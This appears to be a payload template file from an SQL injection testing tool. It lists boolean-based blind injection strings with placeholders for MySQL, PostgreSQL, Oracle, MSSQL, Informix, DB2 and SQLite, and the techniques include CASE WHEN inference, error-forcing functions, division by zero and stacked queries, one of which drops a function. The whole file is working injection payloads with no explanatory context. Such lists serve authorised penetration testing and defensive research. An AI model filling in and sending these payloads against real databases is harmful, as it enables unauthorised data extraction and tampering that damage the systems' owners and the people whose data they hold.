{WHERE1} AND {INFERENCE}
{WHERE2} OR {INFERENCE}
{WHERE1} OR NOT {INFERENCE}
{WHERE1} AND {RANDNUM}=(SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE (SELECT {RANDNUM1} UNION SELECT {RANDNUM2}) END))
{WHERE1} AND {RANDNUM}=(SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE (SELECT {RANDNUM1} UNION SELECT {RANDNUM2}) END)) {GENERIC_SQL_COMMENT}
{WHERE2} OR {RANDNUM}=(SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE (SELECT {RANDNUM1} UNION SELECT {RANDNUM2}) END)) {GENERIC_SQL_COMMENT}
{WHERE1} AND {INFERENCE} {GENERIC_SQL_COMMENT}
{WHERE2} OR {INFERENCE} {GENERIC_SQL_COMMENT}
{WHERE1} OR NOT {INFERENCE} {GENERIC_SQL_COMMENT}
{WHERE1} AND {INFERENCE} #
{WHERE2} OR {INFERENCE} #
{WHERE1} OR NOT {INFERENCE} #
{WHERE1} AND {INFERENCE}  %16
{WHERE2} OR {INFERENCE} %16
{WHERE1} RLIKE (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE 0x28 END))
{WHERE1} AND MAKE_SET({INFERENCE},{RANDNUM1})
{WHERE2} OR MAKE_SET({INFERENCE},{RANDNUM1})
{WHERE1} AND ELT({INFERENCE},{RANDNUM1})
{WHERE2} OR ELT({INFERENCE},{RANDNUM1})
{WHERE1} AND EXTRACTVALUE({RANDNUM},CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE 0x3A END)
{WHERE2} OR EXTRACTVALUE({RANDNUM},CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE 0x3A END)
{WHERE1} AND (SELECT (CASE WHEN ({INFERENCE}) THEN NULL ELSE CAST('{RANDSTR}' AS NUMERIC) END)) IS NULL
{WHERE2} OR (SELECT (CASE WHEN ({INFERENCE}) THEN NULL ELSE CAST('{RANDSTR}' AS NUMERIC) END)) IS NULL
{WHERE1} AND (SELECT (CASE WHEN ({INFERENCE}) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,{RANDNUM}) END) FROM DUAL) IS NULL
{WHERE2} OR (SELECT (CASE WHEN ({INFERENCE}) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,{RANDNUM}) END) FROM DUAL) IS NULL
{WHERE1} AND CASE WHEN {INFERENCE} THEN {RANDNUM} ELSE JSON('{RANDSTR}') END
{WHERE2} OR CASE WHEN {INFERENCE} THEN {RANDNUM} ELSE JSON('{RANDSTR}') END
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE (SELECT {RANDNUM1} UNION SELECT {RANDNUM2}) END))
{WHERE3} MAKE_SET({INFERENCE},{RANDNUM1})
{WHERE3} MAKE_SET({INFERENCE},{ORIGVALUE})
{WHERE3} ELT({INFERENCE},{RANDNUM1})
{WHERE3} ELT({INFERENCE},{ORIGVALUE})
{WHERE3} ({INFERENCE})*{RANDNUM1}
{WHERE3} ({INFERENCE})*{ORIGVALUE}
{WHERE3} SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE 1/(SELECT 0) END))
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE 1/(SELECT 0) END))
{WHERE3} (SELECT * FROM GENERATE_SERIES({RANDNUM},{RANDNUM},CASE WHEN ({INFERENCE}) THEN 1 ELSE 0 END) LIMIT 1)
{WHERE3} (SELECT {ORIGVALUE} FROM GENERATE_SERIES({RANDNUM},{RANDNUM},CASE WHEN ({INFERENCE}) THEN 1 ELSE 0 END) LIMIT 1)
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE {RANDNUM}*(SELECT {RANDNUM} UNION ALL SELECT {RANDNUM1}) END)
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM}*(SELECT {RANDNUM} UNION ALL SELECT {RANDNUM1}) END))
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)
{WHERE3} (SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM} END) FROM SYSMASTER:SYSDUAL)
{WHERE3} IIF({INFERENCE},{RANDNUM},1/0)
{WHERE3} IIF({INFERENCE},{ORIGVALUE},1/0)
{WHERE3} (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM DUAL UNION SELECT {RANDNUM1} FROM DUAL) END)
{WHERE3} (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM DUAL UNION SELECT {RANDNUM1} FROM DUAL) END)
{WHERE3} (CASE WHEN {INFERENCE} THEN {RANDNUM} ELSE NULL END)
{WHERE3} (CASE WHEN {INFERENCE} THEN {ORIGVALUE} ELSE NULL END)
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE 1/(SELECT 0) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE 1/(SELECT 0) END))
{WHERE1} ,(SELECT * FROM GENERATE_SERIES({RANDNUM},{RANDNUM},CASE WHEN ({INFERENCE}) THEN 1 ELSE 0 END) LIMIT 1)
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE {RANDNUM}*(SELECT {RANDNUM} UNION ALL SELECT {RANDNUM1}) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE {RANDNUM}*(SELECT {RANDNUM} UNION ALL SELECT {RANDNUM1}) END))
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
{WHERE1} ,(SELECT (CASE WHEN ({INFERENCE}) THEN {ORIGVALUE} ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
{WHERE1} ,IIF({INFERENCE},1,1/0)
{WHERE1} ,IIF({INFERENCE},{ORIGVALUE},1/0)
{WHERE1} ,(CASE WHEN {INFERENCE} THEN 1 ELSE NULL END)
{WHERE1} ,(CASE WHEN {INFERENCE} THEN {ORIGVALUE} ELSE NULL END)
{WHERE1} ,(SELECT CASE WHEN {INFERENCE} THEN 1 ELSE RAISE_ERROR(70001, '{RANDSTR}') END FROM SYSIBM.SYSDUMMY1)
{WHERE1} ,(SELECT CASE WHEN {INFERENCE} THEN {ORIGVALUE} ELSE RAISE_ERROR(70001, '{RANDSTR}') END FROM SYSIBM.SYSDUMMY1)
{WHERE1} HAVING {INFERENCE}
{WHERE1} ;SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END)
{WHERE1} ;SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE {RANDNUM}*(SELECT {RANDNUM} FROM INFORMATION_SCHEMA.PLUGINS) END)
{WHERE1} ;SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE 1/(SELECT 0) END)
{WHERE1} ;SELECT * FROM GENERATE_SERIES({RANDNUM},{RANDNUM},CASE WHEN ({INFERENCE}) THEN 1 ELSE 0 END) LIMIT 1
{WHERE1} ;IF({INFERENCE}) SELECT {RANDNUM} ELSE DROP FUNCTION {RANDSTR}
{WHERE1} ;SELECT (CASE WHEN ({INFERENCE}) THEN 1 ELSE {RANDNUM}*(SELECT {RANDNUM} UNION ALL SELECT {RANDNUM1}) END)
{WHERE1} ;SELECT (CASE WHEN ({INFERENCE}) THEN {RANDNUM} ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL
{WHERE1} ;IIF({INFERENCE},1,1/0)
{WHERE1} ;SELECT CASE WHEN {INFERENCE} THEN 1 ELSE NULL END
